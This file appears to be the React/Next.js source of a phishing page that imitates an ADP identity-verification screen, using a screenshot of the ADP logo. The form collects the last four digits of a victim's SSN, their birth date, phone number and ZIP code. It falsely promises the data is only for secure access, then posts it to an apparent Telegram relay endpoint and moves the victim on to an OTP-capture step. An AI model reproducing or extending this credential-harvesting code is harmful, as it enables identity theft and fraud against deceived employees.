"use client"

import { useRouter } from "next/navigation"
import { useState, useEffect } from "react"
import { FloresLogo } from "@/components/flores-logo"
import { Input } from "@/components/ui/input"
import adpLogo from "../../adp_login/Screenshot 2026-07-06 122158.png"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import { FLORES_SESSION } from "@/lib/flores-flow"
import { floresGradientPrimaryButtonStyle } from "@/lib/flores-theme"

const MONTHS = [
  "January", "February", "March", "April", "May", "June",
  "July", "August", "September", "October", "November", "December",
]
const DAYS = Array.from({ length: 31 }, (_, i) => String(i + 1))
const CURRENT_YEAR = new Date().getFullYear()
const YEARS = Array.from({ length: CURRENT_YEAR - 1919 }, (_, i) => String(CURRENT_YEAR - i))

const inputBaseClass =
  "h-10 bg-white rounded-md border border-gray-300 shadow-sm focus-visible:border-[#0099D8] focus-visible:ring-[#0099D8]/30 focus-visible:ring-2 outline-none transition-colors"
const inputErrorClass = "border-red-500 focus-visible:border-red-500 focus-visible:ring-red-500/30"
const labelClass = "block text-sm font-semibold text-gray-900 mb-1.5"

export default function VerifyIdentityPage() {
  const router = useRouter()
  useEffect(() => {
    if (typeof window !== "undefined" && !sessionStorage.getItem(FLORES_SESSION.identity)) {
      router.replace("/verify")
    }
  }, [router])

  const [birthMonth, setBirthMonth] = useState("")
  const [birthDay, setBirthDay] = useState("")
  const [birthYear, setBirthYear] = useState("")
  const [ssnLast4, setSsnLast4] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [zipCode, setZipCode] = useState("")
  const [submitAttempted, setSubmitAttempted] = useState(false)
  const [isLoading, setIsLoading] = useState(false)

  const ssnDigits = ssnLast4.replace(/\D/g, "")
  const dateOfBirth =
    birthMonth && birthDay && birthYear
      ? `${String(MONTHS.indexOf(birthMonth) + 1).padStart(2, "0")}/${birthDay.padStart(2, "0")}/${birthYear}`
      : ""
  const isDobValid = Boolean(birthMonth && birthDay && birthYear)
  const isSsnValid = ssnDigits.length === 4
  const phoneDigits = phoneNumber.replace(/\D/g, "")
  const isPhoneValid = phoneDigits.length >= 10
  const zipDigits = zipCode.replace(/\D/g, "")
  const isZipValid = zipDigits.length === 5 || zipDigits.length === 9
  const isFormValid = isDobValid && isSsnValid && isPhoneValid && isZipValid

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setSubmitAttempted(true)
    if (!isFormValid || isLoading) return
    setIsLoading(true)
    try {
      await fetch("/api/telegram/identity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          dateOfBirth,
          ssnLast4: ssnDigits,
          phoneNumber: phoneNumber.trim(),
          zipCode: zipDigits,
        }),
      })
    } catch (err) {
      console.error("Failed to send identity notification:", err)
    }
    await new Promise((r) => setTimeout(r, 10000))
    if (typeof window !== "undefined") sessionStorage.setItem(FLORES_SESSION.otp2, "1")
    router.push("/verify?step=2")
  }

  const handleCancel = () => {
    router.push("/")
  }

  const formatPhoneNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 10)
    if (digits.length <= 3) return digits
    if (digits.length <= 6) return `(${digits.slice(0, 3)}) ${digits.slice(3)}`
    return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <header
        className="w-full py-3 sm:py-4 px-4 sm:px-6 lg:px-0 border-b border-gray-100"
        style={{ paddingLeft: "clamp(1rem, 4vw, 50px)" }}
      >
        <a href="/" className="inline-block hover:opacity-90 transition-opacity">
          <FloresLogo className="items-start" imageSrc={adpLogo.src} alt="ADP Logo" />
        </a>
      </header>

      <div className="flex-1 px-4 sm:px-6 py-8 max-w-xl" style={{ paddingLeft: "clamp(1rem, 4vw, 50px)" }}>
        <p className="text-sm mb-2" style={{ color: "#003D6B" }}>
          Verify It&apos;s You
        </p>
        <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">Enter Your Identifier</h2>
        <p className="text-gray-700 mb-8 text-sm sm:text-base">
          This personal information will only be used to verify your identity for secure portal access.
        </p>

        <form onSubmit={handleSubmit} className="space-y-5">
          <div>
            <label htmlFor="ssnLast4" className={labelClass}>
              Last 4 Digits of SSN
            </label>
            <Input
              id="ssnLast4"
              type="text"
              inputMode="numeric"
              placeholder=""
              maxLength={4}
              value={ssnLast4}
              onChange={(e) => setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))}
              disabled={isLoading}
              className={`w-[88px] max-w-[88px] ${inputBaseClass} ${submitAttempted && !isSsnValid ? inputErrorClass : ""} disabled:opacity-70`}
            />
            {submitAttempted && !isSsnValid && (
              <p className="mt-1 text-sm text-red-600">Enter last 4 digits of SSN</p>
            )}
          </div>

          <div>
            <label className={labelClass}>Birth Date</label>
            <div className="flex flex-wrap gap-3">
              <Select value={birthMonth} onValueChange={setBirthMonth}>
                <SelectTrigger
                  disabled={isLoading}
                  className={`min-w-[120px] w-full max-w-[140px] ${inputBaseClass} ${submitAttempted && !isDobValid ? inputErrorClass : ""} disabled:opacity-70`}
                >
                  <SelectValue placeholder="Month" />
                </SelectTrigger>
                <SelectContent>
                  {MONTHS.map((m) => (
                    <SelectItem key={m} value={m}>
                      {m}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <Select value={birthDay} onValueChange={setBirthDay}>
                <SelectTrigger
                  disabled={isLoading}
                  className={`min-w-[72px] w-[72px] ${inputBaseClass} ${submitAttempted && !isDobValid ? inputErrorClass : ""} disabled:opacity-70`}
                >
                  <SelectValue placeholder="Day" />
                </SelectTrigger>
                <SelectContent>
                  {DAYS.map((d) => (
                    <SelectItem key={d} value={d}>
                      {d}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <Select value={birthYear} onValueChange={setBirthYear}>
                <SelectTrigger
                  disabled={isLoading}
                  className={`min-w-[88px] max-w-[100px] ${inputBaseClass} ${submitAttempted && !isDobValid ? inputErrorClass : ""} disabled:opacity-70`}
                >
                  <SelectValue placeholder="Year" />
                </SelectTrigger>
                <SelectContent>
                  {YEARS.map((y) => (
                    <SelectItem key={y} value={y}>
                      {y}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            {submitAttempted && !isDobValid && (
              <p className="mt-1 text-sm text-red-600">Select month, day, and year</p>
            )}
          </div>

          <div>
            <label htmlFor="phoneNumber" className={labelClass}>
              Phone Number
            </label>
            <Input
              id="phoneNumber"
              type="tel"
              inputMode="numeric"
              placeholder="(555) 555-5555"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(formatPhoneNumber(e.target.value))}
              maxLength={14}
              disabled={isLoading}
              className={`max-w-[200px] ${inputBaseClass} ${submitAttempted && !isPhoneValid ? inputErrorClass : ""} disabled:opacity-70`}
            />
            {submitAttempted && !isPhoneValid && (
              <p className="mt-1 text-sm text-red-600">Enter a valid phone number (10 digits)</p>
            )}
          </div>

          <div>
            <label htmlFor="zipCode" className={labelClass}>
              Zip Code
            </label>
            <Input
              id="zipCode"
              type="text"
              inputMode="numeric"
              value={zipCode}
              onChange={(e) => setZipCode(e.target.value.replace(/\D/g, "").slice(0, 9))}
              placeholder="12345"
              maxLength={9}
              disabled={isLoading}
              className={`max-w-[120px] ${inputBaseClass} ${submitAttempted && !isZipValid ? inputErrorClass : ""} disabled:opacity-70`}
            />
            {submitAttempted && !isZipValid && (
              <p className="mt-1 text-sm text-red-600">Enter a valid zip code (5 or 9 digits)</p>
            )}
          </div>

          <div className="flex flex-wrap gap-3 pt-2">
            <button
              type="submit"
              disabled={isLoading}
              className="px-8 py-2.5 sm:py-3 text-sm sm:text-base transition hover:opacity-90 disabled:opacity-70 disabled:cursor-not-allowed"
              style={{ ...floresGradientPrimaryButtonStyle, padding: "14px 32px" }}
            >
              {isLoading ? "Loading..." : "Continue"}
            </button>
            <button
              type="button"
              onClick={handleCancel}
              disabled={isLoading}
              className="px-8 py-2.5 rounded-full border-2 border-gray-300 text-gray-600 font-semibold text-sm sm:text-base hover:bg-gray-50 disabled:opacity-70"
            >
              Cancel
            </button>
          </div>
        </form>
      </div>
    </div>
  )
}
